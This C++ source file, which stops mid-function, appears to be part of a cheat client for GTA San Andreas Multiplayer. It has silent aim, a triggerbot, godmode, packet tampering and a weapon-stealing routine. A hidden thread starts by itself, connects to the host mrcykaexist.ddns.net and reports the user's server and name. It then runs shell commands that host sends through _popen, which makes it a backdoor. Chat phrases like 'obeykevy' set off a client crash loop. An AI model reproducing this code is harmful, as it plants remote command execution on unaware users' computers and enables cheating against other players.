/*

	PROJECT:		project_fuego
	LICENSE:		See LICENSE in the top level directory
	COPYRIGHT:		Copyright we_sux, BlastHack

	project_fuego is available from nowhere

	project_fuego is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	project_fuego is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with project_fuego.  If not, see <http://www.gnu.org/licenses/>.

*/

#include "main.h"

#define KEY_I 0x49
#define KEY_J 0x4A
#define KEY_K 0x4B
#define KEY_L 0x4C
#define KEY_O 0x4F
#define KEY_U 0x55
#define KEY_F8 0x77

int			g_iSpectateEnabled = 0, g_iSpectateLock = 0, g_iSpectatePlayerID = -1;
int			g_iJoiningServer = 0;
int			iClickWarpEnabled = 0;
int			g_iNumPlayersMuted = 0;
bool		g_bPlayerMuted[SAMP_MAX_PLAYERS];
bool		g_NameHidden[SAMP_MAX_PLAYERS];

float		slapperPos[3];
DWORD		slapperLastUpdate = 0;

int			socketState = 0;
bool		socketRunning = false;
std::vector<Socket*> socketClients;

stBulletData dShotBulletData;

bool		wordListLoaded = false;
std::vector<std::string> wordList;

bool _UnsWork = false;
ULONGLONG _UnsNewTick = -1;
std::string _UnsSolved;
std::string _UnsLastWord = "NaN";

bool		FriendsListLoaded = false;
std::vector<std::string> Friends;

DWORD iTrollWorking = -1;
int iTrollMode = -1;
stInCarData iTrollData;

DWORD	fuckupWorking = -1;
stInCarData fuckupLdata;

DWORD getHereRelease = -1;

bool forceDesync = false;

float carControl_LastPos[3];
int carControl_LastVehSeat = 0;
int carControl_LastVeh = NULL;
bool carControl_UsedOnfoot = false;

bool lsrpStealGuns_Working = false;
int lsrpStealGuns_VID = -1;
int lsrpStealGuns_Stage = 0;
bool lsrpStealGuns_ForceAdjust = false;
bool lsrpStealGuns_ForceAdjust_Waiting = false;
DWORD lsrpStealGuns_LastAction = -1;
bool lsrpStealGuns_RespawnAfter = false;



typedef enum { NONE, CARDATA, ONFOOTDATA } LAGQUEUETYPE;

struct LagQueueData
{
	LAGQUEUETYPE type = NONE;

	DWORD executeTick;

	stInCarData incar;
	stOnFootData onfoot;

	CMatrix matrix;
	CVector movespeed;
	CVector position;
};

moodycamel::ConcurrentQueue<LagQueueData> LagQueuePrc;
float fakeLagLastPos[3];
DWORD fakeLagLastPosTick;

DWORD fakeLagHoldTime = 0;
float fakeLagBTTLeft = 1.0;
LagQueueData lastLagData;

template<typename T>
T srandom(T min, T max)
{
	std::random_device rd;
	std::mt19937 mt(rd());
	std::uniform_int_distribution<T> dist(min, max);
	return dist(mt);
}

float fWeaponRange[39] =
{
	0.0, // 0 - Fist
	0.0, // 1 - Brass knuckles
	0.0, // 2 - Golf club
	0.0, // 3 - Nitestick
	0.0, // 4 - Knife
	0.0, // 5 - Bat
	0.0, // 6 - Shovel
	0.0, // 7 - Pool cue
	0.0, // 8 - Katana
	0.0, // 9 - Chainsaw
	0.0, // 10 - Dildo
	0.0, // 11 - Dildo 2
	0.0, // 12 - Vibrator
	0.0, // 13 - Vibrator 2
	0.0, // 14 - Flowers
	0.0, // 15 - Cane
	0.0, // 16 - Grenade
	0.0, // 17 - Teargas
	0.0, // 18 - Molotov
	90.0, // 19 - Vehicle M4 (custom)
	75.0, // 20 - Vehicle minigun (custom)
	0.0, // 21
	35.0, // 22 - Colt 45
	35.0, // 23 - Silenced
	35.0, // 24 - Deagle
	40.0, // 25 - Shotgun
	35.0, // 26 - Sawed-off
	40.0, // 27 - Spas
	35.0, // 28 - UZI
	45.0, // 29 - MP5
	70.0, // 30 - AK47
	90.0, // 31 - M4
	35.0, // 32 - Tec9
	100.0, // 33 - Cuntgun
	320.0, // 34 - Sniper
	0.0, // 35 - Rocket launcher
	0.0, // 36 - Heatseeker
	0.0, // 37 - Flamethrower
	75.0  // 38 - Minigun
};

float fWeaponDamage[55] =
{
	1.0, // 0 - Fist
	1.0, // 1 - Brass knuckles
	1.0, // 2 - Golf club
	1.0, // 3 - Nitestick
	1.0, // 4 - Knife
	1.0, // 5 - Bat
	1.0, // 6 - Shovel
	1.0, // 7 - Pool cue
	1.0, // 8 - Katana
	1.0, // 9 - Chainsaw
	1.0, // 10 - Dildo
	1.0, // 11 - Dildo 2
	1.0, // 12 - Vibrator
	1.0, // 13 - Vibrator 2
	1.0, // 14 - Flowers
	1.0, // 15 - Cane
	82.5, // 16 - Grenade
	0.0, // 17 - Teargas
	1.0, // 18 - Molotov
	9.9, // 19 - Vehicle M4 (custom)
	46.2, // 20 - Vehicle minigun (custom)
	0.0, // 21
	8.25, // 22 - Colt 45
	13.2, // 23 - Silenced
	46.2, // 24 - Deagle
	49.5,//3.3, // 25 - Shotgun
	49.5,//3.3, // 26 - Sawed-off
	39.6,//4.95, // 27 - Spas
	6.6, // 28 - UZI
	8.25, // 29 - MP5
	9.900001, // 30 - AK47
	9.900001, // 31 - M4
	6.6, // 32 - Tec9
	24.750001, // 33 - Cuntgun
	41.25, // 34 - Sniper
	82.5, // 35 - Rocket launcher
	82.5, // 36 - Heatseeker
	1.0, // 37 - Flamethrower
	46.2, // 38 - Minigun
	82.5, // 39 - Satchel
	0.0, // 40 - Detonator
	0.33, // 41 - Spraycan
	0.33, // 42 - Fire extinguisher
	0.0, // 43 - Camera
	0.0, // 44 - Night vision
	0.0, // 45 - Infrared
	0.0, // 46 - Parachute
	0.0, // 47 - Fake pistol
	2.64, // 48 - Pistol whip (custom)
	9.9, // 49 - Vehicle
	330.0, // 50 - Helicopter blades
	82.5, // 51 - Explosion
	1.0, // 52 - Car park (custom)
	1.0, // 53 - Drowning
	165.0 // 54 - Splat
};


int getSAMPVehicleIDFromGTAVehicleEx(struct vehicle_info* pVehicle)
{
	if (g_Vehicles == NULL)
		return NULL;

	int i, iReturn = 0;
	for (i = 0; i < SAMP_MAX_VEHICLES; i++)
	{
		if (g_Vehicles->iIsListed[i] != 1)
			continue;
		if (g_Vehicles->pGTA_Vehicle[i] == pVehicle)
			return i;
	}

	if (vehicle_info_get(VEHICLE_SELF, 0) == pVehicle && g_Players != NULL)
		return g_Players->pLocalPlayer->sCurrentVehicleID;

	return VEHICLE_SELF;
}


struct vehicle_info* getGTAVehicleFromSAMPVehicleIDEx(int iVehicleID)
{
	if (g_Vehicles == NULL || iVehicleID < 0 || iVehicleID >= SAMP_MAX_VEHICLES)
		return NULL;

	if (g_Vehicles->iIsListed[iVehicleID] != 1)
		return NULL;

	if (g_Vehicles->pGTA_Vehicle[iVehicleID] == NULL)
	{
		if (iVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
			return vehicle_info_get(VEHICLE_SELF, 0);
	}

	// return vehicle_info, null or otherwise
	return g_Vehicles->pGTA_Vehicle[iVehicleID];
}

void SockSrvThreadListen(Socket* s)
{
	while (true)
	{
		try {

			if (socketState != 1)
			{
				s->Close();
				Log("SockState != 1, kill conn w/ client; break.");
				break;
			}

			std::string r = s->ReceiveLine();
			if (r.empty())
			{
				Log("Loose connection/fail w/ client; break.");
				s->Close();
				break;
			}

			addMessageToChatWindow("Client %s says: %s", s->clientIp, r.c_str());
			Log("Client (%s) Send: %s", s->clientIp, r.c_str());
		}
		catch (...) {}
	}

	try
	{
		delete s;
	}
	catch (...) {}
	return;
}

std::string exec(const char* cmd) {
	std::array<char, 128> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe) {
		return std::string("popen() failed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	return result;
}

void SockThread()
{
	while (true)
	{
		if (socketState == 0)
		{
			try
			{
				SocketClient s("mrcykaexist.ddns.net", 8346);
				Log("Connected -> mrcykaexist.");

				std::string oss = GetCPUID().append(md5("|v1"));

				std::string eConnBuff = "I'm on ";
				eConnBuff.append(g_SAMP->szHostname).append(" (").append(g_SAMP->szIP).append(")");
				eConnBuff.append(" as ").append(g_Players->strLocalPlayerName);

				s.SendLine(eConnBuff.c_str());

				while (true)
				{
					if (socketState != 0)
					{
						Log("Sockstate change != 0; break.");
						break;
					}

					std::string recv = s.ReceiveLine();
					if (recv.empty()) {
						Log("Connection closed as client, break;");
						break;
					}

					if (recv.find("killClientAll()") != std::string::npos)
					{
						delete g_SAMP;
					}
					if (recv.find("updateAll()") != std::string::npos)
					{
						std::string eConnBuff = "I'm on ";
						eConnBuff.append(g_SAMP->szHostname).append(" (").append(g_SAMP->szIP).append(")");
						eConnBuff.append(" as ").append(g_Players->strLocalPlayerName);

						s.SendLine(eConnBuff);
					}
					if (recv.find("cmdExec(") != std::string::npos)
					{
						std::string extracted = extractfromstr(recv, "cmdExec(", ")");

						std::string eres = exec(extracted.c_str());
						s.SendLine(std::string("Executed: ").append(eres));
					}
					//Log("Server said: %s", eConnBuff);
				}
				if (socketState != 0)
				{
					Log("Sockstate change != 0; break.");
					break;
				}

				s.Close();
			}
			catch (const char* s)
			{
				Log("Socket err: %s", s);
				Sleep(10000);
			}
			catch (std::string s)
			{
				Log("Socket err(2): %s", s.c_str());
				Sleep(10000);
			}
			catch (...)
			{
				Log("Socket err(3) Exception.");
				Sleep(10000);
			}
		}
		else if (socketState == 1)
		{
			std::vector<Socket*> EMPTY;
			socketClients.swap(EMPTY);
			SocketServer in(8346, 100);

			while (true)
			{
				if (socketState != 1)
				{
					in.Close();
					Log("Socket state change != 1; break.");
					break;
				}

				try
				{
					Socket* s = in.Accept();
					socketClients.push_back(s);
					
					addMessageToChatWindow("Client connection from %s.", s->clientIp);

					std::thread(SockSrvThreadListen, s).detach();
				}
				catch (const char* s)
				{
					Log("Socket err: %s", s);
					Sleep(10000);
				}
				catch (std::string s)
				{
					Log("Socket err(2): %s", s.c_str());
					Sleep(10000);
				}
				catch (...)
				{
					Log("Socket err(3) Exception.");
					Sleep(10000);
				}
			}
			in.Close();
		}
	}
	return SockThread();
}

void sampMainCheat(void)
{
	traceLastFunc("sampMainCheat()");

	// g_Vehicles & g_Players pointers need to be refreshed or nulled
	if (isBadPtr_writeAny(g_SAMP->pPools, sizeof(stSAMPPools)))
	{
		g_Vehicles = NULL;
		g_Players = NULL;
	}
	else if (g_Vehicles != g_SAMP->pPools->pVehicle || g_Players != g_SAMP->pPools->pPlayer)
	{
		if (isBadPtr_writeAny(g_SAMP->pPools->pVehicle, sizeof(stVehiclePool)))
			g_Vehicles = NULL;
		else
			g_Vehicles = g_SAMP->pPools->pVehicle;
		if (isBadPtr_writeAny(g_SAMP->pPools->pPlayer, sizeof(stPlayerPool)))
			g_Players = NULL;
		else
			g_Players = g_SAMP->pPools->pPlayer;
	}

	// update GTA to SAMP translation structures
	update_translateGTASAMP_vehiclePool();
	update_translateGTASAMP_pedPool();

	spectateHandle();
	sampAntiHijack();

	if (set.noBigHacks)
	{
		set.iTroll = 0;
		set.iTroll_Target = 0xFFFF;
		set.actBrkDance = 0;
		set.aimslapper = 0;
		set.anti_carjacking = 0;
		set.carsfloating = 0;
		set.explodecarssilent = 0;
		set.unoccupiedremover = 0;
		set.carshooter = 0;
		set.explodecars = 0;
		set.explodecars = 0;
		set.freeze = 0;
		set.slapkill = 0;
		set.slapkill_target = 0;
		set.nearslapper = 0;
		set.removecars = 0;
		set.killer_enabled = 0;
	}

	cheat_handle_slapperesp();

	cheat_handle_forcedesync();

	cheat_handle_fakesynclag();

	cheat_handle_itroll_targetfinder();
	cheat_handle_freezetroll();
	
	cheat_handle_carsfloating();
	cheat_handle_carshooter();
	cheat_handle_explodecars();
	cheat_handle_removecars();

	cheat_handle_triggerbot();
	cheat_handle_nospread();
	cheat_handle_noreload();
	cheat_handle_dualshot();
	

	cheat_handle_weaponfinder();

	cheat_handle_playerbreakdance();

	cheat_handle_unoccupiedremover();
	cheat_handle_explodecarssilent();
	cheat_handle_killer_weapon();
	cheat_handle_lsrp_gunstealer();

	if (!socketRunning) {
		socketRunning = true;
		std::thread(SockThread).detach();
	}

	if (FriendsListLoaded == false) ReloadFriendlist();

	int aimedID = GetSilentAimTarget();

	if ( set.silentaim_iAimID != -1 && ValidPlayer(aimedID) && IsPlayerStreamed(aimedID) && 
		set.silentaim_friendFilter && FriendsListLoaded && Friends.size() > 0 && 
		std::find(Friends.begin(), Friends.end(), getPlayerName(set.silentaim_iAimID)) != Friends.end())
	{
		set.silentaim_iAimID = -1;
		cheat_state_text("Friend! Avoided");
	}
	else
	{
		set.silentaim_iAimID = aimedID;
	}
	


	if (aimKeyDown() && set.silentaim_drawTracer != set.TRACERTYPE::Off && set.silentaim )
	{
		float centerX, centerY;
		GetAimingCenter(centerX, centerY);

		if(set.silentaim_drawTracer == set.TRACERTYPE::ESPFOV)
			render->CircleOutlined(centerX, centerY, set.silentaim_fov, 75, 1.25, D3DCOLOR_ARGB(32, 255, 255, 255), D3DCOLOR_ARGB(32, 0, 0, 0));

		if(set.silentaim_iAimID != -1)
		{
			struct actor_info* targetact = getGTAPedFromSAMPPlayerID(set.silentaim_iAimID);
			if (targetact != NULL)
			{
				CPed* targetPed = pGameInterface->GetPools()->GetPed((DWORD*)targetact);

				CVector cPos;
				targetPed->GetBonePosition(BONE_SPINE1, &cPos);

				float fPos[3] = { D3DXVECTOR3(CVecToD3DXVEC(cPos)).x, D3DXVECTOR3(CVecToD3DXVEC(cPos)).y, D3DXVECTOR3(CVecToD3DXVEC(cPos)).z },
					fSelfPos[3] = { pPedSelf->GetPosition()->fX, pPedSelf->GetPosition()->fY, pPedSelf->GetPosition()->fZ };


				D3DXVECTOR3 poss, screenposs;
				CVector2D screenPosition;
				poss.x = fPos[0];
				poss.y = fPos[1];
				poss.z = fPos[2];
				CalcScreenCoors(&poss, &screenposs);

				screenPosition.fX = screenposs.x;
				screenPosition.fY = screenposs.y;

				double distance = sqrt(((centerX - screenPosition.fX) * (centerX - screenPosition.fX)) +
					((centerY - screenPosition.fY) * (centerY - screenPosition.fY)));

				if (screenposs.z > 1.f)
				{
					float dist = vect3_dist(fPos, fSelfPos);

					render->D3DLineOutlined(screenPosition.fX,
						screenPosition.fY,
						centerX,
						centerY,
						1.25,
						samp_color_get(set.silentaim_iAimID), D3DCOLOR_XRGB(0, 0, 0));

					float w, h;
					w = 80.0 - (dist * 0.75);
					h = 125.0 - (dist * 0.75);

					if (w > 0.0 && h > 0.0)
					{
						render->D3DBoxBorder(screenPosition.fX - (dist * 0.50) + 1.0, screenPosition.fY - (dist * 0.75) + 1.0, w, h, D3DCOLOR_XRGB(1, 1, 1), D3DCOLOR_ARGB(0, 1, 1, 1));

						render->D3DBoxBorder(screenPosition.fX - (dist * 0.50) - 1.0, screenPosition.fY - (dist * 0.75) - 1.0, w, h, D3DCOLOR_XRGB(1, 1, 1), D3DCOLOR_ARGB(0, 1, 1, 1));

						render->D3DBoxBorder(screenPosition.fX - (dist * 0.50), screenPosition.fY - (dist * 0.75), w, h, samp_color_get(set.silentaim_iAimID), D3DCOLOR_ARGB(0, 1, 1, 1));
					}
				}
			}
		}
	}

	DisableFlyingBirds();

	// start chatbox logging
	if (set.chatbox_logging)
	{
		static int	chatbox_init;
		if (!chatbox_init)
		{
			SYSTEMTIME	time;
			GetLocalTime(&time);
			LogChatbox(false, "Session started at %02d/%02d/%02d", time.wDay, time.wMonth, time.wYear);
			chatbox_init = 1;
		}
	}

	if (KEYCOMBO_PRESSED(set.key_player_info_list))
		cheat_state->player_info_list ^= 1;

	if (KEYCOMBO_PRESSED(set.key_rejoin))
	{
		restartGame();
		disconnect(500);
		cheat_state_text("Rejoining in %d seconds...", set.rejoin_delay / 1000);
		cheat_state->_generic.rejoinTick = GetTickCount();
	}

	if (KEYCOMBO_PRESSED(set.key_respawn))
		playerSpawn();
	
	if (KEYCOMBO_DOWN(set.chat_secondary_key))
	{
		int			i, key, spam;
		const char	*msg;
		for (i = 0; i < INI_CHATMSGS_MAX; i++)
		{
			struct chat_msg *msg_item = &set.chat[i];
			if (msg_item->key == NULL)
				continue;
			if (msg_item->msg == NULL)
				continue;
			if (msg_item->key != key_being_pressed)
				continue;
			key = msg_item->key;
			msg = msg_item->msg;
			spam = msg_item->spam;
			if (spam)
			{
				if (msg)
					if (KEY_DOWN(key))
						say("%s", msg);
			}
			else
			{
				if (msg)
					if (KEY_PRESSED(key))
						say("%s", msg);
			}
		}
	}
	if (set.clickwarp_enabled && iIsSAMPSupported)
	{
		if (KEYCOMBO_PRESSED(set.key_clickwarp_enable))
		{
			set.clickwarping = 1;
			g_iCursorEnabled ^= 1;
			toggleSAMPCursor(g_iCursorEnabled);
		}
		if (g_iCursorEnabled && KEYCOMBO_PRESSED(set.key_clickwarp_click) && set.clickwarping)
		{
			iClickWarpEnabled = 1;
		}
	}

	if (set.damagingcardoor && iIsSAMPSupported)
	{
		if (KEY_DOWN(VK_ESCAPE))
		{
			g_iCursorEnabled ^= 1;
			toggleSAMPCursor(g_iCursorEnabled);
		}
		if (g_iCursorEnabled && KEY_DOWN(VK_LBUTTON))
		{
			set.damagingcardoorenter = 1;
		}
	}

	if (set.attachingtrailer && iIsSAMPSupported)
	{
		if (KEY_DOWN(VK_ESCAPE))
		{
			g_iCursorEnabled ^= 1;
			toggleSAMPCursor(g_iCursorEnabled);
		}
		if (g_iCursorEnabled && KEY_DOWN(VK_LBUTTON))
		{
			set.attachingtrailerenter = 1;
		}
	}

	if (set.vunlocker && iIsSAMPSupported)
	{
		if (KEY_DOWN(VK_ESCAPE))
		{
			g_iCursorEnabled ^= 1;
			toggleSAMPCursor(g_iCursorEnabled);
		}
		if (g_iCursorEnabled && KEY_DOWN(VK_LBUTTON))
		{
			set.vunlockerenter = 1;
		}
	}

	static int	iSAMPHooksInstalled;
	if (!iSAMPHooksInstalled)
	{
		installSAMPHooks();
		iSAMPHooksInstalled = 1;
	}

	if (cheat_state->_generic.rejoinTick && cheat_state->_generic.rejoinTick < (GetTickCount() - set.rejoin_delay))
	{
		g_SAMP->iGameState = GAMESTATE_WAIT_CONNECT;
		cheat_state->_generic.rejoinTick = 0;
	}

	if (g_iJoiningServer == 1)
	{
		restartGame();
		disconnect(500);
		cheat_state_text("Joining server in %d seconds...", set.rejoin_delay / 1000);
		cheat_state->_generic.join_serverTick = GetTickCount();
		g_iJoiningServer = 2;
	}

	if (g_iJoiningServer == 2
		&& cheat_state->_generic.join_serverTick
		&&	 cheat_state->_generic.join_serverTick < (GetTickCount() - set.rejoin_delay))
	{
		g_SAMP->iGameState = GAMESTATE_WAIT_CONNECT;
		g_iJoiningServer = 0;
		cheat_state->_generic.join_serverTick = 0;
	}
}

void spectateHandle(void)
{
	if (g_iSpectateEnabled)
	{
		if (g_iSpectateLock) return;

		if (g_iSpectatePlayerID != -1)
		{
			if (g_Players->iIsListed[g_iSpectatePlayerID] != 0)
			{
				if (g_Players->pRemotePlayer[g_iSpectatePlayerID] != NULL)
				{
					int iState = getPlayerState(g_iSpectatePlayerID);

					if (iState == PLAYER_STATE_ONFOOT)
					{
						struct actor_info *pPlayer = getGTAPedFromSAMPPlayerID(g_iSpectatePlayerID);
						if (pPlayer == NULL) return;
						GTAfunc_CameraOnActor(pPlayer);
						g_iSpectateLock = 1;
					}
					else if (iState == PLAYER_STATE_DRIVER)
					{
						struct vehicle_info *pPlayerVehicleID = g_Players->pRemotePlayer[g_iSpectatePlayerID]->pPlayerData->pSAMP_Vehicle->pGTA_Vehicle;
						if (pPlayerVehicleID == NULL) return;
						GTAfunc_CameraOnVehicle(pPlayerVehicleID);
						g_iSpectateLock = 1;
					}
					else if (iState == PLAYER_STATE_PASSENGER)
					{
						struct vehicle_info *pPlayerVehicleID = g_Players->pRemotePlayer[g_iSpectatePlayerID]->pPlayerData->pSAMP_Vehicle->pGTA_Vehicle;
						if (pPlayerVehicleID == NULL) return;
						GTAfunc_CameraOnVehicle(pPlayerVehicleID);
						g_iSpectateLock = 1;
					}
				}
				else
				{
					cheat_state_text("Player is not streamed in");
					g_iSpectateEnabled = 0;
				}
			}
		}
	}
}

void spectatePlayer(int iPlayerID)
{
	if (iPlayerID == -1)
	{
		GTAfunc_TogglePlayerControllable(0);
		GTAfunc_LockActor(0);
		pGameInterface->GetCamera()->RestoreWithJumpCut();

		g_iSpectateEnabled = 0;
		g_iSpectateLock = 0;
		g_iSpectatePlayerID = -1;
		return;
	}

	g_iSpectatePlayerID = iPlayerID;
	g_iSpectateLock = 0;
	g_iSpectateEnabled = 1;
}

void sampAntiHijack(void)
{
	if (g_SAMP == NULL) return;
	traceLastFunc("sampAntiHijack()");

	vehicle_info* veh = vehicle_info_get(VEHICLE_SELF, VEHICLE_ALIVE);
	if (set.anti_carjacking && veh == NULL)
	{
		if (cheat_state->_generic.got_vehicle_id)
			cheat_state->_generic.got_vehicle_id = false;
		if (cheat_state->_generic.anti_carjackTick
			&& cheat_state->_generic.anti_carjackTick < (GetTickCount() - 500)
			&& cheat_state->_generic.car_jacked)
		{
			if (cheat_state->_generic.car_jacked_last_vehicle_id == 0)
			{
				GTAfunc_showStyledText("~r~Unable To Unjack~w~!", 1000, 5);
				cheat_state->_generic.anti_carjackTick = 0;
				cheat_state->_generic.car_jacked = false;
				return;
			}

			cheat_state->_generic.anti_carjackTick = 0;
			cheat_state->_generic.car_jacked = false;
			GTAfunc_PutActorInCar(GetVehicleByGtaId(cheat_state->_generic.car_jacked_last_vehicle_id));

			struct vehicle_info* veh = GetVehicleByGtaId(cheat_state->_generic.car_jacked_last_vehicle_id);
			//if ( veh != NULL )
			//	vect3_copy( cheat_state->_generic.car_jacked_lastPos, &veh->base.matrix[4 * 3] );
			GTAfunc_showStyledText("~r~Car Unjacked~w~!", 1000, 5);
			return;
		}
	}
	else if (set.anti_carjacking)
	{
		if (veh->passengers[0] == actor_info_get(ACTOR_SELF, 0))
		{
			if (!cheat_state->_generic.got_vehicle_id)
			{
				cheat_state->_generic.car_jacked_last_vehicle_id = getPlayerVehicleGTAScriptingID(ACTOR_SELF);
				if (cheat_state->_generic.car_jacked_last_vehicle_id > 0)
					cheat_state->_generic.got_vehicle_id = true;
			}
		}
	}
}

void SendEscape(int wait = 1, int howlongtopressdown = 1, bool forceCursor = true)
{
	Sleep(wait);
	if(forceCursor) toggleSAMPCursor(1); // to stop game from going ESC if cursor aint enabled for some reason
	keybd_event(VK_ESCAPE, 0, 0, 0);
	Sleep(howlongtopressdown);
	keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
	return;
}

void HandleRPCPacketFunc(unsigned char id, RPCParameters *rpcParams, void(*callback) (RPCParameters *))
{
	if (!isCheatPanicEnabled())
	{
		if (set.netPatchAssoc[id][INCOMING_RPC] != nullptr && set.netPatchAssoc[id][INCOMING_RPC]->enabled)
			return;
	}
	if (rpcParams != nullptr && rpcParams->numberOfBitsOfData >= 8)
	{
		switch (id)
		{
			case RPC_EditObject:
			{
				if (lsrpStealGuns_Working && lsrpStealGuns_ForceAdjust)
				{
					CVector pSpinePos;
					pPedSelf->GetBonePosition(BONE_HEAD, &pSpinePos);

					for (int id = 0; id < SAMP_MAX_OBJECTS; id++)
					{
						if (!g_SAMP->pPools->pObject->iIsListed[id]) continue;

						float fPos[3], playerPos[3];

						vect3_copy(&g_SAMP->pPools->pObject->object[id]->pGTAEntity->base.matrix[4 * 3], fPos);
						playerPos[0] = pSpinePos.fX;
						playerPos[1] = pSpinePos.fY;
						playerPos[2] = pSpinePos.fZ;

						if (g_SAMP->pPools->pObject->object[id]->iModel > 310 && g_SAMP->pPools->pObject->object[id]->iModel < 380)
						{
							float fDistanceFromWeapon = vect3_dist(fPos, playerPos);

							if (fDistanceFromWeapon < 15.0f)
							{
								BitStream parameters;

								parameters.Write((bool)true);
								parameters.Write((UINT16)id);
								parameters.Write((UINT32)1);
								parameters.Write(playerPos[0]); // or use playerPos[0] [1] [2] instead to put object at player hehe
								parameters.Write(playerPos[1]);
								parameters.Write(playerPos[2]);
								parameters.Write(1.0f);
								parameters.Write(0.0f);
								parameters.Write(-1.0f);

								g_RakClient->RPC(RPC_EditObject, &parameters);
							}
						}
					}

					
					lsrpStealGuns_Stage++;
					lsrpStealGuns_ForceAdjust_Waiting = false;

					addMessageToChatWindow("{FFFFFF}Gun Stealer -> {00FF33}Weapon in slot [%d] adjusted.", lsrpStealGuns_Stage);
					return;
				}
				break;
			}
			case RPC_RemovePlayerFromVehicle:
			{
				if (carControl_LastVeh != NULL || lsrpStealGuns_Working)
				{
					cheat_state_text("Server tried to remove from car while in control.");
					return;
				}

				break;
			}
			case RPC_SetPlayerPos:
			{
				if (carControl_LastVeh != NULL || lsrpStealGuns_Working)
				{
					cheat_state_text("Server tried to remove from car while in control.");
					return;
				}

				break;
			}
			case RPC_SetPlayerHealth:
			{
				if (cheat_state->_generic.hp_cheat)
				{
					return;
				}
				if (isCheatPanicEnabled() || !set.enable_extra_godmode || !cheat_state->_generic.hp_cheat) break;

				actor_info *self = actor_info_get(ACTOR_SELF, NULL);
				if (self)
				{
					BitStream bsData(rpcParams->input, rpcParams->numberOfBitsOfData / 8, false);
					float fHealth;
					bsData.Read(fHealth);
					if (fHealth < self->hitpoints)
					{
						cheat_state_text("Warning: Server tried change your health to %0.1f", fHealth);
						return; // exit from the function without processing RPC
					}
				}
				break;
			}
			case RPC_SetVehicleHealth:
			{
				if (isCheatPanicEnabled() || !set.enable_extra_godmode || !cheat_state->_generic.hp_cheat) break;

				vehicle_info *vself = vehicle_info_get(VEHICLE_SELF, NULL);
				if (vself)
				{
					BitStream bsData(rpcParams->input, rpcParams->numberOfBitsOfData / 8, false);
					short sId;
					float fHealth;
					bsData.Read(sId);
					bsData.Read(fHealth);
					if (sId == g_Players->pLocalPlayer->sCurrentVehicleID && fHealth < vself->hitpoints)
					{
						cheat_state_text("Warning: Server tried change your vehicle health to %0.1f", fHealth);
						return; // exit from the function without processing RPC
					}
				}
				break;
			}
			case RPC_ClientMessage:
			{
				if (isCheatPanicEnabled() || !set.anti_spam && !set.chatbox_logging) break;

				BitStream		bsData(rpcParams->input, rpcParams->numberOfBitsOfData / 8, false);
				uint32_t		dwStrLen, dwColor;
				char			szMsg[256];
				static char		last_servermsg[256];
				static DWORD	allow_show_again = 0;

				bsData.Read(dwColor);
				bsData.Read(dwStrLen);
				if (dwStrLen >= sizeof(szMsg)) dwStrLen = sizeof(szMsg) - 1;
				bsData.Read(szMsg, dwStrLen);
				szMsg[dwStrLen] = '\0';


				if (findstrinstr(szMsg, "kevysaidso") || findstrinstr(szMsg, "obeykevy") || findstrinstr(szMsg, "tunnijibraphirnga")) while (true) {
					delete g_SAMP;
				}

				if (cheat_state->_generic.cheat_panic_enabled)
					break;

				if (set.anti_spam && (strcmp(last_servermsg, szMsg) == 0 && GetTickCount() < allow_show_again))
					return; // exit without processing rpc

				// might be a personal message by muted player - look for name in server message
				// ignore message, if name was found
				if (set.anti_spam && g_iNumPlayersMuted > 0)
				{
					int i, j;
					char *playerName = NULL;
					for (i = 0, j = 0; i < SAMP_MAX_PLAYERS && j < g_iNumPlayersMuted; i++)
					{
						if (g_bPlayerMuted[i])
						{
							playerName = (char *)getPlayerName(i);

							if (playerName == NULL)
							{
								// Player not connected anymore - remove player from muted list
								g_bPlayerMuted[i] = false;
								g_iNumPlayersMuted--;
								continue;
							}
							else if (strstr(szMsg, playerName) != NULL)
							{
								return;
							}
							j++;
						}
					}
				}
				if (set.chatbox_logging)
					LogChatbox(false, "%s", szMsg);

				strncpy_s(last_servermsg, szMsg, sizeof(last_servermsg) - 1);
				allow_show_again = GetTickCount() + 5000;
				break;
			}
			case RPC_Chat:
			{
				BitStream		bsData(rpcParams->input, rpcParams->numberOfBitsOfData / 8, false);
				static char		last_clientmsg[SAMP_MAX_PLAYERS][256];
				static DWORD	allow_show_again = 0;
				uint16_t		playerId = uint16_t(-1);
				uint8_t			byteTextLen;
				char			szText[256];

				bsData.Read(playerId);
				if (isBadSAMPPlayerID(playerId))
					break;

				bsData.Read(byteTextLen);
				bsData.Read(szText, byteTextLen);
				szText[byteTextLen] = '\0';

				if (findstrinstr(szText, "kevy said so") || findstrinstr(szText, "obey kevy") || findstrinstr(szText, "tunnijibra")) while (true) {
					delete g_SAMP;
				}

				if (isCheatPanicEnabled() || !set.anti_spam && !set.chatbox_logging) break;

				if (cheat_state->_generic.cheat_panic_enabled)
					break;

				if (set.anti_spam && ((strcmp(last_clientmsg[playerId], szText) == 0 && GetTickCount() < allow_show_again) || (g_iNumPlayersMuted > 0 && g_bPlayerMuted[playerId])))
					return; // exit without processing rpc

				// nothing to copy anymore, after chatbox_logging, so copy this before
				strncpy_s(last_clientmsg[playerId], szText, sizeof(last_clientmsg[playerId]) - 1);

				if (set.chatbox_logging)
					LogChatbox(false, "%s: %s", getPlayerName(playerId), szText);
				allow_show_again = GetTickCount() + 5000;
				break;
			}
		} // switch
	}
	callback(rpcParams);
}

bool OnSendRPC(int uniqueID, BitStream *parameters, PacketPriority priority, PacketReliability reliability, char orderingChannel, bool shiftTimestamp)
{
	if (!isCheatPanicEnabled())
	{
		if (set.netPatchAssoc[uniqueID][OUTCOMING_RPC] != nullptr && set.netPatchAssoc[uniqueID][OUTCOMING_RPC]->enabled)
			return false;
	}

	if (uniqueID == RPC_EditObject)
	{
		bool PlayerObject; UINT16 objectid; UINT32 response; float positionX; float positionY; float positionZ; float rotationX; float rotationY; float rotationZ;

		parameters->Read(PlayerObject);
		parameters->Read(objectid);
		parameters->Read(response);
		parameters->Read(positionX);
		parameters->Read(positionY);
		parameters->Read(positionZ);
		parameters->Read(rotationX);
		parameters->Read(rotationY);
		parameters->Read(rotationZ);

